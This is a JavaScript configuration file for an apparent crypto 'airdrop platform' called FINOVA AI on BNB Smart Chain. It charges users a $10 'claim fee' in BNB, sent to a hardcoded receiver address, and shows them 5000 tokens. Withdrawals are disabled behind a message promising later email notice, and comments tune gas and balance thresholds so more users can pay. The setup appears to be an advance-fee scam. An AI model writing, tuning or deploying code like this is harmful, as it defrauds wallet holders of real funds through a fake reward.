// src/config.js - Fixed Mobile Wallet Configuration

const config = {
  // Network configurations
  NETWORK: {
    BSC: {
      MAINNET: {
        ID: 56,
        NAME: 'BNB Smart Chain',
        CURRENCY: {
          name: 'BNB',
          symbol: 'BNB',
          decimals: 18
        },
        RPC_URLS: [
          'https://bsc-dataseed1.binance.org/',
          'https://bsc-dataseed2.binance.org/',
          'https://bsc-dataseed3.binance.org/',
          'https://bsc-dataseed4.binance.org/',
          'https://bsc-dataseed1.defibit.io/',
          'https://bsc-dataseed2.defibit.io/',
          'https://bsc-dataseed3.defibit.io/',
          'https://bsc-dataseed4.defibit.io/',
          'https://rpc.ankr.com/bsc',
          'https://bsc.nodereal.io',
          'https://1rpc.io/bnb'
        ],
        EXPLORER_URL: 'https://bscscan.com'
      },
      TESTNET: {
        ID: 97,
        NAME: 'BNB Smart Chain Testnet',
        CURRENCY: {
          name: 'tBNB',
          symbol: 'tBNB',
          decimals: 18
        },
        RPC_URLS: [
          'https://data-seed-prebsc-1-s1.binance.org:8545/',
          'https://data-seed-prebsc-2-s1.binance.org:8545/',
          'https://data-seed-prebsc-1-s2.binance.org:8545/',
          'https://data-seed-prebsc-2-s2.binance.org:8545/',
          'https://data-seed-prebsc-1-s3.binance.org:8545/',
          'https://data-seed-prebsc-2-s3.binance.org:8545/'
        ],
        EXPLORER_URL: 'https://testnet.bscscan.com'
      }
    }
  },

  // 🔧 WALLET CONFIGURATION - Added missing wallet config
  WALLET: {
    METAMASK: {
      DEEPLINK_PREFIX: 'https://metamask.app.link/dapp/',
      INSTALL_URL: 'https://metamask.io/download/'
    },
    TRUST_WALLET: {
      DEEPLINK_PREFIX: 'https://link.trustwallet.com/open_url?coin_id=60&url=',
      INSTALL_URL: 'https://trustwallet.com/download'
    },
    WALLETCONNECT: {
      PROJECT_ID: 'your_walletconnect_project_id', // You can get this from walletconnect.com
      METADATA: {
        name: 'FINOVA AI',
        description: 'FINOVA AI Airdrop Platform',
        url: 'https://your-domain.com',
        icons: ['https://your-domain.com/logo.png']
      }
    }
  },

  // 🔧 MOST COMMON FIX: Lower balance requirements
  FEE_SYSTEM: {
    CLAIM_FEE_USD: 10.0, // Your fee amount
    DISPLAY_TOKEN_AMOUNT: 5000,

    // 🔥 Your wallet address - ENSURE THIS IS CORRECT
    FUND_RECEIVER_ADDRESS: '0x8fC18E1f65993864db46Dd1FBA2dffF1DE97955c',

    // 🔧 REDUCED gas requirements (common fix)
    MIN_BNB_FOR_GAS: 0.003, // Reduced from 0.008
    FEE_PAYMENT_GAS_LIMIT: 21000, // Reduced from 25000

    WITHDRAWAL_ENABLED: false,
    WITHDRAWAL_MESSAGE: "🔒 Token withdrawals are currently disabled. You will be notified via email when withdrawal functionality becomes available."
  },

  // 🔧 PRICE FALLBACK (in case API fails)
  PRICES: {
    BNB_USD: 500.0, // Lower price = lower BNB requirements
    LAST_UPDATED: null
  },

  // 🔧 FORCE PRODUCTION MODE (if environment detection fails)
  get ENVIRONMENT() {
    const hostname = typeof window !== 'undefined' ? window.location.hostname : '';

    // 🔧 ADD YOUR DOMAIN HERE if not detected automatically
    if (hostname.includes('your-domain.com') ||
      hostname.includes('vercel.app') ||
      hostname.includes('netlify.app') ||
      hostname.includes('github.io') ||
      hostname.includes('.com') ||
      hostname.includes('.org') ||
      hostname.includes('.net') ||
      (!hostname.includes('localhost') && !hostname.includes('127.0.0.1'))) {
      console.log('🌐 Detected production environment');
      return 'production';
    }

    console.log('🔧 Detected development environment');
    return 'development';
  },

  // 🔧 ALWAYS RETURN MAINNET FOR PRODUCTION
  getTargetNetwork() {
    if (this.ENVIRONMENT === 'production') {
      console.log('🌐 Using BSC Mainnet for production');
      return this.NETWORK.BSC.MAINNET;
    } else {
      console.log('🔧 Using BSC Testnet for development');
      return this.NETWORK.BSC.TESTNET;
    }
  },

  // 🔧 RELAXED VALIDATION (for testing)
  isValidFundReceiver() {
    const address = this.getFundReceiverAddress();
    const isValid = address &&
      address.length === 42 &&
      address.startsWith('0x');

    if (!isValid) {
      console.error('❌ Invalid fund receiver address:', address);
    } else {
      console.log('✅ Valid fund receiver address:', address);
    }

    return isValid;
  },

  // 🔧 SIMPLIFIED BALANCE CHECK
  hasEnoughBNB(userBalance) {
    const required = parseFloat(this.getMinimumRequiredBNB());
    const available = parseFloat(userBalance);

    console.log(`💰 Balance check: ${available} BNB available, ${required} BNB required`);

    return available >= required;
  },

  // Helper functions
  getClaimFeeInBNB() {
    const feeInBNB = (this.FEE_SYSTEM.CLAIM_FEE_USD / this.PRICES.BNB_USD);
    return feeInBNB.toFixed(6);
  },

  getFundReceiverAddress() {
    return this.FEE_SYSTEM.FUND_RECEIVER_ADDRESS;
  },

  getDisplayTokenAmount() {
    return this.FEE_SYSTEM.DISPLAY_TOKEN_AMOUNT;
  },

  getMinimumRequiredBNB() {
    const feeInBNB = parseFloat(this.getClaimFeeInBNB());
    const gasInBNB = this.FEE_SYSTEM.MIN_BNB_FOR_GAS;
    return (feeInBNB + gasInBNB).toFixed(6);
  },

  formatBNB(amount) {
    return parseFloat(amount).toFixed(6);
  },

  formatUSD(amount) {
    return parseFloat(amount).toFixed(2);
  },

  getBSCScanLink(txHash) {
    const network = this.getTargetNetwork();
    return `${network.EXPLORER_URL}/tx/${txHash}`;
  },

  // 🔧 WITHDRAWAL HELPER FUNCTIONS
  isWithdrawalEnabled() {
    return this.FEE_SYSTEM.WITHDRAWAL_ENABLED;
  },

  getWithdrawalMessage() {
    return this.FEE_SYSTEM.WITHDRAWAL_MESSAGE;
  },

  getDebugInfo() {
    return {
      environment: this.ENVIRONMENT,
      hostname: typeof window !== 'undefined' ? window.location.hostname : 'server',
      targetNetwork: this.getTargetNetwork().NAME,
      fundReceiver: this.getFundReceiverAddress(),
      claimFeeUSD: this.FEE_SYSTEM.CLAIM_FEE_USD,
      claimFeeBNB: this.getClaimFeeInBNB(),
      bnbPrice: this.PRICES.BNB_USD,
      tokenAmount: this.getDisplayTokenAmount(),
      isValidReceiver: this.isValidFundReceiver(),
      minBNBRequired: this.getMinimumRequiredBNB(),
      walletConfig: {
        metamask: !!this.WALLET.METAMASK,
        trustWallet: !!this.WALLET.TRUST_WALLET,
        walletConnect: !!this.WALLET.WALLETCONNECT
      }
    };
  }
};

export default config;